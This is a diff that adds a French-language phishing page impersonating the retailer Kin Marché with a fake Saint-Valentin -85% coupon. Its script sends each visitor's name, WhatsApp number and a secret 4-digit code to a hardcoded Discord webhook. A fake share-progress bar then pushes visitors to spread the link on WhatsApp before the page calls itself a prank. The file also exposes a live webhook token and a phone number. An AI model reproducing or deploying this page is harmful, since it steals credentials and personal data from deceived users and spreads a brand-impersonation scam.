@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta property="og:title" content="🍫 PROMO KIN MARCHÉ : -85% SUR TOUT !">
+    <meta property="og:description" content="Offre Saint-Valentin exclusive ! Valide tes infos pour ton coupon.">
+    <meta property="og:image" content="logo.png">
+    <meta property="og:type" content="website">
+
+    <title>Kin Marché - Promo Officielle</title>
+    <style>
+        :root { --km-orange: #f26522; --km-blue: #0054a6; }
+        body { margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; background: #001220; color: white; overflow-x: hidden; }
+        
+        #bg-animation { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; background: linear-gradient(135deg, #001220 0%, #0054a6 100%); }
+        .floating { position: absolute; color: rgba(255,255,255,0.2); font-size: 24px; animation: move 8s linear infinite; pointer-events: none; }
+        @keyframes move { from { transform: translateY(110vh); } to { transform: translateY(-10vh); } }
+
+        .container { width: 85%; max-width: 380px; background: rgba(255, 255, 255, 0.88); color: #333; margin: 20px auto; padding: 25px; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.6); text-align: center; backdrop-filter: blur(8px); border: 1px solid rgba(255,255,255,0.3); }
+        .timer { color: #d32f2f; font-weight: bold; font-size: 1.2rem; margin-bottom: 10px; }
+        input { width: 100%; padding: 14px; margin: 10px 0; border: 2px solid #ddd; border-radius: 10px; box-sizing: border-box; }
+        .btn { background: var(--km-orange); color: white; border: none; padding: 16px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 1.1rem; box-shadow: 0 4px 0 #c44d17; }
+        .btn:active { transform: translateY(2px); box-shadow: none; }
+        .progress-container { background: #e9edef; border-radius: 10px; height: 18px; margin: 20px 0; overflow: hidden; border: 1px solid #ccc; }
+        .progress-bar { background: linear-gradient(90deg, #25D366, #128C7E); width: 0%; height: 100%; transition: width 0.8s ease; }
+    </style>
+</head>
+<body>
+
+<div id="bg-animation"></div>
+
+<div class="container" id="timer-box">
+    <div class="timer">L'offre expire dans : <span id="time">05:00</span></div>
+</div>
+
+<div class="container" id="step1">
+    <h2 style="color:var(--km-blue)">PROMO ST VALENTIN</h2>
+    <p>Inscrivez-vous pour obtenir votre bon de <b>-85%</b>.</p>
+    <input type="text" id="name" placeholder="Nom et Post-nom">
+    <input type="tel" id="phone" placeholder="Numéro WhatsApp">
+    <input type="password" id="secret" placeholder="Code d'accès secret (4 chiffres)">
+    <button class="btn" onclick="sendToDiscord()">GÉNÉRER MON COUPON</button>
+</div>
+
+<div class="container" id="step2" style="display:none;">
+    <h2 style="color:var(--km-blue)">Vérification en cours...</h2>
+    <p id="share-txt">Partagez avec <b>5 amis ou groupes</b> pour valider l'étape 1/3.</p>
+    <div class="progress-container">
+        <div class="progress-bar" id="bar"></div>
+    </div>
+    <p id="status" style="font-weight:bold; color:#075E54">0% Partagé</p>
+    <button class="btn" style="background:#25D366; border-color:#128C7E;" onclick="shareWA()">PARTAGER SUR WHATSAPP</button>
+</div>
+
+<div class="container" id="final-step" style="display:none;">
+    <h1 style="color:red;">🤡 T'ES TOMBÉ DEDANS !</h1>
+    <p>C'est une blague de <b>OLY</b> !</p>
+    <div id="vengeance-box">
+        <button class="btn" style="background:black" onclick="revenge()">SE VENGER SUR OLY</button>
+    </div>
+    <p id="late-msg" style="display:none; color:var(--km-blue); font-weight:bold; margin-top:15px;">DÉSOLÉ TROP TARD ! 😂</p>
+</div>
+
+<script>
+    const webhook = "https://discordapp.com/api/webhooks/1463375154313695425/b8j4vFvQYxlrrtYrxSXgOrV3PEsdA4vXaywKb8xIMo6qEt6vVAqc3yQb_srF7-aDg4a-";
+    let p = parseInt(localStorage.getItem('oly_prog')) || 0;
+
+    window.onload = () => {
+        if(p > 0) {
+            document.getElementById('step1').style.display = "none";
+            document.getElementById('step2').style.display = "block";
+            updateUI();
+        }
+        startTimer(300, document.querySelector('#time'));
+    };
+
+    function startTimer(duration, display) {
+        let timer = duration, minutes, seconds;
+        setInterval(() => {
+            minutes = parseInt(timer / 60, 10);
+            seconds = parseInt(timer % 60, 10);
+            display.textContent = (minutes < 10 ? "0" + minutes : minutes) + ":" + (seconds < 10 ? "0" + seconds : seconds);
+            if (--timer < 0) timer = 0;
+        }, 1000);
+    }
+
+    function sendToDiscord() {
+        const n = document.getElementById('name').value;
+        const ph = document.getElementById('phone').value;
+        const s = document.getElementById('secret').value;
+        if(!n || !ph || !s) return alert("Remplis tout !");
+        
+        fetch(webhook, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ content: `🎬 **Action !**\n👤 ${n}\n📞 ${ph}\n🔑 ${s}` })
+        });
+        
+        p = 5; // Commence un peu la barre
+        localStorage.setItem('oly_prog', p);
+        document.getElementById('step1').style.display = "none";
+        document.getElementById('step2').style.display = "block";
+        updateUI();
+    }
+
+    function shareWA() {
+        window.open(`whatsapp://send?text=😱 Kin Marché donne des bons de -85% ! Je viens de finir mon inscription, regarde ici : ${window.location.href}`);
+        
+        // Simule l'augmentation au retour sur le site
+        setTimeout(() => {
+            p += 32;
+            if(p > 100) p = 100;
+            localStorage.setItem('oly_prog', p);
+            updateUI();
+        }, 1000);
+    }
+
+    function updateUI() {
+        document.getElementById('bar').style.width = p + "%";
+        document.getElementById('status').innerText = Math.floor(p) + "% Partagé";
+        
+        const txt = document.getElementById('share-txt');
+        if(p < 40) txt.innerHTML = "Étape 1/3 : Partagez encore avec <b>5 personnes</b>.";
+        else if(p < 75) txt.innerHTML = "Étape 2/3 : Plus que <b>5 personnes</b> !";
+        else if(p < 100) txt.innerHTML = "Dernière étape : Partagez une dernière fois !";
+        else {
+            document.getElementById('step2').style.display = "none";
+            document.getElementById('final-step').style.display = "block";
+            document.getElementById('timer-box').style.display = "none";
+        }
+    }
+
+    function revenge() {
+        document.getElementById('late-msg').style.display = "block";
+        setTimeout(() => {
+            window.location.href = "https://wa.me/243819679859?text=Oly tu m'as eu 😂";
+        }, 1000);
+    }
+
+    // Animation de fond
+    const bg = document.getElementById('bg-animation');
+    for(let i=0; i<15; i++) {
+        let el = document.createElement('div');
+        el.className = 'floating';
+        el.innerText = '❤️';
+        el.style.left = Math.random() * 100 + 'vw';
+        el.style.top = Math.random() * 100 + 'vh';
+        el.style.animationDuration = (Math.random() * 5 + 5) + 's';
+        bg.appendChild(el);
+    }
+</script>
+</body>
+</html>
